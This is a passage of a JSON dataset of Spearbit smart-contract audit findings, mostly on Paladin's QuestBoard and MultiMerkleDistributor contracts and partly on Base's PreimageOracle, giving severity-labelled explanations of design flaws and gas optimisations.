of this happening is low, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Reduce impact of emergencyUpdatequestPeriod()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Function emergencyUpdatequestPeriod() allows the merkle tree to be updated. The merkle tree contains an embedded index parameter which is used to prevent double claims. When the merkleRoot is updated, the layout of indexes in the merkle tree could become different. Example: Suppose the initial merkle tree contains information for: - user A: index=1, account = 0x1234, amount=100 - user B: index=2, account = 0x5689, amount=200 Then user A claims => _setClaimed(..., 1) is set. Now it turns out a mistake is made with the merkle tree, and it should contain: - user B: index=1, account = 0x5689, amount=200 - user C: index=2, account = 0xabcd, amount=300 Now user B will not be able to claim because bit 1 has already been set. Under this situation the following issues can occur:  Someone who has already claimed might be able to claim again.  Someone who has already claimed has too much.  Someone who has already claimed has too little, and cannot longer claim the rest because _setClaimed() has already been set.  someone who has not yet claimed might not be able to claim because _setClaimed() has already been set by another user. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Verify the correct merkle tree is used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The MultiMerkleDistributor.sol contract does not verify that the merkle tree belongs to the right quest and period. If the wrong merkle tree is added then the wrong rewards can be claimed. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Prevent mixing rewards from different quests and periods",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The MultiMerkleDistributor.sol contract does not verify that the sum of all amounts in the merkle tree are equal to the rewards allocated for that quest and for that period. This could happen if there is a bug in the merkle tree creation script. If the sum of the amounts is too high, then tokens from other quests or other periods could be claimed, which will give problems later on, when claims are done for the other quest/periods. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Nonexistent zero address check for newQuestBoard in updateQuestManager function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Nonexistent zero address check for newQuestBoard in updateQuestManager function. Assigning newQuestBoard to a zero address may cause unintended behavior.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Verify period is always a multiple of week",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The calculations with period assume that period is a multiple of WEEK. However, period is often assigned as a parameter and not verified if it is a multiple of WEEK. This calculation may cause unexpected results. Note: When it is verified that period is a multiple of WEEK, the following calculation can be simplified: - int256 nextPeriod = ((period + WEEK) / WEEK) * WEEK; + int256 nextPeriod = period + WEEK; The following function does not explicitly verify that period is a multiple of WEEK. function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... uint256 nextPeriod = ((period + WEEK) / WEEK) * WEEK; ... } function getQuestIdsForPeriod(uint256 period) external view returns(uint256[] memory) { ... } function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) ... { ... } function addMerkleRoot(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function addMultipleMerkleRoot(..., uint256 period, ...) external isAlive onlyAllowed nonReentrant { ... } ,! function claim(..., uint256 period, ...) public { ... } function updateQuestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function emergencyUpdatequestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function claimQuest(address account, uint256 questID, ClaimParams[] calldata claims) external { ,! ... // also uses period as part of the claims array require(questMerkleRootPerPeriod[claims[i].questID][claims[i].period] != 0, \"MultiMerkle: not updated yet\"); require(!isClaimed(questID, claims[i].period, claims[i].index), \"MultiMerkle: already claimed\"); ... require( MerkleProof.verify(claims[i].merkleProof, questMerkleRootPerPeriod[questID][claims[i].period], ,! node), \"MultiMerkle: Invalid proof\" ); ... _setClaimed(questID, claims[i].period, claims[i].index); ... emit Claimed(questID, claims[i].period, claims[i].index, claims[i].amount, rewardToken, account); ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk QuestBoard.sol#L201-L203, QuestBoard.sol#L750-L815,"
        ]
    },
    {
        "title": "Missing safety check to ensure array length does not underflow and revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Several functions use questPeriods[questID][questPeriods[questID].length - 1]. The sec- ond value in the questPeriods mapping is questPeriods[questID].length - 1. It is possible for this function to revert if the case arises where questPeriods[questID].length is 0. Looking at the code this is not likely to occur but it is a valid safety check that covers possible strange edge cases. function _getRemainingDuration(uint256 questID) internal view returns(uint256) { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestDuration(...) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestReward(...) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestObjective(... ) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Prevent dual entry point tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Function recoverERC20() in contract QuestBoard.sol only allows the retrieval of non whitelisted tokens. Recently an issue has been found to circumvent these checks, with so called dual entry point tokens. See a description here: compound-tusd-integration-issue-retrospective function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { require(!whitelistedTokens[token], \"QuestBoard: Cannot recover whitelisted token\"); IERC20(token).safeTransfer(owner(), amount); return true; } 13",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Limit the creation of quests",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The function getQuestIdsForPeriod() could run out of gas if someone creates an enormous amount of quests. See also: what-is-the-array-size-limit-of-a-returned-array. Note: If this were to happen, the QuestIds can also be retrieved directly from the getter of questsByPeriod(). Note: closeQuestPeriod() has the same problem, but closePartOfQuestPeriod() is a workaround for this. Requiring a minimal amount of tokens to create a quest can limit the number of quests. The minimum number of tokens to pay is: duration * minObjective * minRewardPerVotePerToken[]. The values of duration and minObjective are least 1, but minRewardPerVotePerToken[] could be 0 and even if minRewardPerVotePerToken is non zero but still low, the number of tokes required is neglectable when using tokens with 18 decimals. Requiring a minimum amount of tokens also helps to prevent the creation of spam quests. 14 function getQuestIdsForPeriod(uint256 period) external view returns(uint256[] memory) { return questsByPeriod[period]; // could run out of gas } function createQuest(...) { ... require(duration > 0, \"QuestBoard: Incorrect duration\"); require(objective >= minObjective, \"QuestBoard: Objective too low\"); ... require(rewardPerVote >= minRewardPerVotePerToken[rewardToken], \"QuestBoard: RewardPerVote too low\"); ... vars.rewardPerPeriod = (objective * rewardPerVote) / UNIT; // can be 0 ==> totalRewardAmount can be 0 require((totalRewardAmount * platformFee)/MAX_BPS == feeAmount, \"QuestBoard: feeAmount incorrect\"); // feeAmount can be 0 ... require((vars.rewardPerPeriod * duration) == totalRewardAmount, \"QuestBoard: totalRewardAmount incorrect\"); ... IERC20(rewardToken).safeTransferFrom(vars.creator, address(this), totalRewardAmount); IERC20(rewardToken).safeTransferFrom(vars.creator, questChest, feeAmount); ... ,! ,! ,! ,! } constructor(address _gaugeController, address _chest){ ... minObjective = 1000 * UNIT; // initial value, but can be overwritten ... } function updateMinObjective(uint256 newMinObjective) external onlyOwner { require(newMinObjective > 0, \"QuestBoard: Null value\"); // perhaps set higher minObjective = newMinObjective; } function whitelistToken(address newToken, uint256 minRewardPerVote) public onlyAllowed { // geen isAlive??? ... minRewardPerVotePerToken[newToken] = minRewardPerVote; // no minimum value required ... ,! }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Non existing states are considered active",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "periods- if a state is checked of a non existing However, ByQuest[questIDs[i]][period] is active. questIDs[i] or a questID that has no quest in that period, then periodsByQuest[questIDs[i]][period] is empty and periodsByQuest[questIDs[i]][period].currentState == 0. closePartOfQuestPeriod() function verifies state the of if As PeriodState.ACTIVE ==0, the stated is considered to be active and the require() doesnt trigger and pro- cessing continues. Luckily as all other values are also 0 (especially _questPeriod.rewardAmountPerPeriod), toDistributeAmount will be 0 and no tokens are sent. However slight future changes in the code might introduce unwanted effects. enum PeriodState { ACTIVE, CLOSED, DISTRIBUTED } // ACTIVE == 0 function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive ,! onlyAllowed nonReentrant { ... for(uint256 i = 0; i < length;){ ... require( periodsByQuest[questIDs[i]][period].currentState == PeriodState.ACTIVE, // doesn't work ,! if questIDs[i] & period are empty \"QuestBoard: Period already closed\" );",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Critical changes should use two-step process",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The QuestBoard.sol, QuestTreasureChest.sol and QuestTreasureChest.sol contracts inherit from OpenZeppelins Ownable contract which enables the onlyOwner role to transfer ownership to another address. Its possible that the onlyOwner role mistakenly transfers ownership to the wrong address, resulting in a loss of the onlyOwner role. This is an unwanted situation because the owner role is neccesary for several methods.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Prevent accidental call of emergencyUpdatequestPeriod()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Functions updateQuestPeriod() and emergencyUpdatequestPeriod() are very similar. However, if function emergencyUpdatequestPeriod() is accidentally used instead of updateQuestPeriod(), then period isnt push()ed to the array questClosedPeriods[]. This means function getClosedPeriodsByQuests() will not be able to retreive all the closed periods. function updateQuestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) external onlyAllowed returns(bool) { ... questClosedPeriods[questID].push(period); ... questMerkleRootPerPeriod[questID][period] = merkleRoot; ... ,! } function emergencyUpdatequestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) external onlyOwner returns(bool) { ... // no push() questMerkleRootPerPeriod[questID][period] = merkleRoot; ... ,! }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Usage of deprecated safeApprove",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "OpenZeppelin safeApprove implementation is deprecated. Reference. Using this deprecated func- tion can lead to unintended reverts and potential locking of funds. SafeERC20.safeApprove() Insecure Behaviour.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "questID on the NewQuest event should be indexed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The NewQuest event currently does not have questID set to indexed which goes against the pattern set by the other events in the contract where questID is actually indexed.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add validation checks on addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Missing validation checks on addresses passed into the constructor functions. Adding these checks on _gaugeController and _chest can prevent costly errors the during deployment of the contract. Also in function claim() and claimQuest() there is no zero check for for account argument.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Changing public constant variables to non-public can save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Several constants are public and thus have a getter function. called from the outside, therefore it is not necessary to make them public. It is unlikely for these values to be",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Using uint instead of bool to optimize gas usage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "A bool is more costly than uint256. Because each write action generates an additional SLOAD to read the contents of the slot, change the bits occupied by bool and finally write back. contract BooleanTest { mapping(address => bool) approvedManagers; // Gas Cost : 44144 function approveManager(address newManager) external{ approvedManagers[newManager] = true; } mapping(address => uint256) approvedManagersWithoutBoolean; // Gas Cost : 44069 function approveManagerWithoutBoolean(address newManager) external{ approvedManagersWithoutBoolean[newManager] = 1; } }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize && operator usage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The check && consumes more gas than using multiple require statements. Example test can be seen below: //Gas Cost: 22515 function increaseQuestReward(uint256 newRewardPerVote, uint256 addedRewardAmount, uint256 feeAmount) ,! public { require(newRewardPerVote != 0 && addedRewardAmount != 0 && feeAmount != 0, \"QuestBoard: Null ,! amount\"); } //Gas Cost: 22477 function increaseQuestRewardTest(uint256 newRewardPerVote, uint256 addedRewardAmount, uint256 ,! feeAmount) public { require(newRewardPerVote != 0, \"QuestBoard: Null amount\"); require(addedRewardAmount != 0, \"QuestBoard: Null amount\"); require(feeAmount != 0, \"QuestBoard: Null amount\"); } Note : It costs more gas to deploy but it is worth it after X calls. Trade-offs should be considered.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecesary value set to 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Since all default values in solidity are already 0 it riod.rewardAmountDistributed = 0; here as it should already be 0. is unnecessary to include _questPe-",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize unsigned integer comparison",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Check != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled. While it may seem that > 0 is cheaper than !=0 this is only true without the optimizer being enabled and outside a require statement. If the optimizer is enabled at 10k and it is in a require statement, it would be more gas efficient.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use memory instead of storage in closeQuestPeriod() and closePartOfQuestPeriod()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "In functions closeQuestPeriod() and closePartOfQuestPeriod() a storage pointer _quest is set to quests[questsForPeriod[i]]. This is normally used when write access to the location is need. Nevertheless _quest is read only, to a copy of quests[questsForPeriod[i]] is also sufficient. This can save some gas. function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... Quest storage _quest = quests[questsForPeriod[i]]; ... gaugeController.checkpoint_gauge(_quest.gauge); // read only access of _quest ... uint256 periodBias = gaugeController.points_weight(_quest.gauge, nextPeriod).bias; // read only access of _quest ... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // read only access of _quest ... ,! ,! } function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive onlyAllowed nonReentrant { ... Quest storage _quest = quests[questIDs[i]]; ... gaugeController.checkpoint_gauge(_quest.gauge); // read only access of _quest ... uint256 periodBias = gaugeController.points_weight(_quest.gauge, nextPeriod).bias; // read only access of _quest ... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // read only access of _quest ... ,! ,! ,! }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Revert string size optimization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Shortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met. Revert strings using more than 32 bytes require at least one additional mstore, along with additional operations for computing memory offset.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize withdrawUnusedRewards() and emergencyWithdraw() with pointers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "ByQuest[questID][_questPeriods[i]] several times. pointer to read and update values. This will save gas and also make the code more readable. periods- It is possible to set a pointer to this record and use that withdrawUnusedRewards() emergencyWithdraw() Functions and use function withdrawUnusedRewards(uint256 questID, address recipient) external isAlive nonReentrant { ... if(periodsByQuest[questID][_questPeriods[i]].currentState == PeriodState.ACTIVE) { ... } ... uint256 withdrawableForPeriod = periodsByQuest[questID][_questPeriods[i]].withdrawableAmount; ... if(withdrawableForPeriod > 0){ ... periodsByQuest[questID][_questPeriods[i]].withdrawableAmount = 0; } ... } function emergencyWithdraw(uint256 questID, address recipient) external nonReentrant { ... if(periodsByQuest[questID][_questPeriods[i]].currentState != PeriodState.ACTIVE){ uint256 withdrawableForPeriod = periodsByQuest[questID][_questPeriods[i]].withdrawableAmount; ... if(withdrawableForPeriod > 0){ ... periodsByQuest[questID][_questPeriods[i]].withdrawableAmount = 0; } } else { .. totalWithdraw += periodsByQuest[questID][_questPeriods[i]].rewardAmountPerPeriod; periodsByQuest[questID][_questPeriods[i]].rewardAmountPerPeriod = 0; } ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Needless to initialize variables with default values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "uint256 variables are initialized to a default value of 0 per Solidity docs. Setting a variable to the default value is unnecessary.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize the calculation of the currentPeriod",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The retrieval of currentPeriod is relatively gas expensive because it requires an SLOAD instruction (100 gas) every time. Calculating (block.timestamp / WEEK) * WEEK; is cheaper (TIMESTAMP: 2 gas, MUL: 5 gas, DIV: 5 gas). Refer to evm.codes for more information. Additionally, there is a risk that the call to updatePeriod() is forgotten although it does not happen in the current code. function updatePeriod() public { if (block.timestamp >= currentPeriod + WEEK) { currentPeriod = (block.timestamp / WEEK) * WEEK; } } Note: it is also possible to do all calculations with (block.timestamp / WEEK) instead of (block.timestamp / WEEK) * WEEK, but as the Paladin project has indicated:\"\" This currentPeriod is a timestamp, showing the start date of the current period, and based from the Curve system (because we want the same timestamp they have in the GaugeController).\"",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Change memory to calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "For the function parameters, it is often more optimal to have the reference location to be calldata instead of memory. Changing bytes to calldata will decrease gas usage. OpenZeppelin Pull Request",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Caching array length at the beginning of function can save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Caching array length at the beginning of the function can save gas in the several locations. function multiClaim(address account, ClaimParams[] calldata claims) external { require(claims.length != 0, \"MultiMerkle: empty parameters\"); uint256 length = claims.length; // if this is done before the require, the require can use \"length\" ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Check amount is greater than 0 to avoid calling safeTransfer() unnecessarily",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "A check should be added to make sure amount is greater than 0 to avoid calling safeTransfer() unnecessarily.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unchecked{++i} is more efficient than i++",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The function getAllQuestPeriodsForQuestId uses i++ which costs more gas than ++i, especially in a loop. Also, the createQuest function uses nextID += 1 which costs more gas than ++nextID. Finally the initialization of i = 0 can be skipped, as 0 is the default value.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Could replace claims[i].questID with questID",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Could replace claims[i].questID with questID (as they are equal due to the check above)",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Change function visibility from public to external",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The function updateRewardToken of the QuestBoard contract could be set external to save gas and improve code quality.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Functions isClaimed() and _setClaimed() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The functions isClaimed() and _setClaimed() of the contract MultiMerkleDistributor can be optimized to save gas. See OZ BitMaps for inspiration.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Missing events for owner only functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Several key actions are defined without event declarations. Owner only functions that change critical parameters can emit events to record these changes on-chain for off-chain monitors/tools/interfaces.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use nonReentrant modifier in a consistent way",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The functions claim(), claimQuest() and recoverERC20() of contract MultiMerkleDistributor send tokens but dont have a nonReentrant modifier. All other functions that send tokens do have this modifier. Note: as the checks & effects patterns is used this is not really necessary. function claim(...) public { ... IERC20(rewardToken).safeTransfer(account, amount); } function claimQuest(...) external { ... IERC20(rewardToken).safeTransfer(account, totalClaimAmount); } function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { IERC20(token).safeTransfer(owner(), amount); return true; }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Place struct definition at the beginning of the contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Regarding Solidity Style Guide, the struct definition can move to the beginning of the contract.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improve checks for past quests in increaseQuestReward() and increaseQuestObjective()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The functions increaseQuestReward() and increaseQuestObjective() check: newRewardPerVote > periodsByQuest[questID][currentPeriod].rewardPerVote. This is true when the quest is in the past (e.g. currentPeriod is outside of the quest range), because all the values will be 0. Luckily execution is stopped at _getRemainingDuration(questID), however it would be more logical to put this check near the start of the function. function increaseQuestReward(...) ... { updatePeriod(); ... require(newRewardPerVote > periodsByQuest[questID][currentPeriod].rewardPerVote, \"QuestBoard: New reward must be higher\"); ... uint256 remainingDuration = _getRemainingDuration(questID); require(remainingDuration > 0, \"QuestBoard: no more incoming QuestPeriods\"); ... ,! } The function _getRemainingDuration() reverts when the quest is in the past, as currentPeriod will be larger than lastPeriod. The is not what you would expect from this function. function _getRemainingDuration(uint256 questID) internal view returns(uint256) { uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; return (lastPeriod - currentPeriod) / WEEK; // can revert }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Should make use of token.balanceOf(address(this)); to recover tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Currently when calling the recoverERC20() function there is no way to calculate what the proper amount should be without having to check the contracts balance of token before hand. This will require an extra step and can be easily done inside the function itself.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Floating pragma is set",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The current pragma Solidity directive is ^0.8.10. It is recommended to specify a specific compiler version to ensure that the byte code produced does not vary between builds. Contracts should be deployed using the same compiler version/flags with which they have been tested. Locking the pragma (for e.g. by not using ^ in pragma solidity 0.8.10) ensures that contracts do not accidentally get deployed using an older compiler version with known compiler bugs.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deflationary reward tokens are not handled uniformly across the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The code base does not support rebasing/deflationary/inflationary reward tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typo on comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Across the codebase, there is a typo on the comment. The comment can be seen from the below. * @dev Returns the number of periods to come for a give nQuest",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Require statement with gauge_types function call is redundant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The gauge_types function of the Curve reverts when an invalid gauge is given as a parameter, the QuestBoard: Invalid Gauge error message will not be seen in the QuestBoard contract. The documentation can be seen from the Querying Gauge and Type Weights. function createQuest(...) ... { ... require(IGaugeController(GAUGE_CONTROLLER).gauge_types(gauge) >= 0, \"QuestBoard: Invalid Gauge\"); ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing setter function for the GAUGE_CONTROLLER",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The GAUGE_CONTROLLER address is immutable and set in the constructor. If Curve adds a new version of the gauge controller, the value of GAUGE_CONTROLLER cannot be updated and the contract QuestBoard needs to be deployed again. address public immutable GAUGE_CONTROLLER; constructor(address _gaugeController, address _chest){ GAUGE_CONTROLLER = _gaugeController; ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Empty events emitted in killBoard() and unkillBoard() functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "When an event is emitted, it stores the arguments passed in for the transaction logs. Currently the Killed() and Unkilled() events are emitted without any arguments passed into them defeating the purpose of using an event.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "PreimageOracle.loadPrecompilePreimagePart an outOfGas error in the precompile will overwrite cor- rect preimageParts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "Alexis Williams from Coinbase initially identified this issue in the loadPrecompilePreimagePart function during the engagement with Spearbit. The function calls any _precompile passed as a parameter for a given _input. function loadPrecompilePreimagePart( uint256 _partOffset, address _precompile, bytes calldata _input ) external The _partOffset variable defines which 32 bytes of the precompile returned result will be stored in a preim- ageParts mapping. The key for the mapping is based on a keccak hash, including the _precompile address and _input parameter. The function is public and can be called multiple times. A call with the same parameters should produce again the same key and state updates. If the precompile call reverts, the returned error would be stored in the preimageParts mapping instead. The transaction itself would be successful (see the related test). An attacker could call loadPrecompilePreimagePart with less gas to produce an outOfGas error in the precom- pile. The 63/64 gas rule applies for staticcall and precompiles even when all the available gas() passed as parameter. // Call the precompile to get the result. res := staticcall( gas(), // forward all gas _precompile, add(20, ptr), // input ptr _input.length, 0x0, // Unused as we don  0x00 // don t copy anything  t copy anything ) The loadPrecompilePreimagePart function can have enough gas left to update preimageParts mapping with the outOfGas error. This means a successful preimage result can be overwritten with the outOfGas error for some _partOffset in the preimageParts mapping. Given that the correct preimageParts mapping is needed to reproduce the VM.step in a FaultDisputeGame.step it can lead to an incorrect outcome.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Invalid Ancestor Lookup Leading to Out-of-Bounds Array Access",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
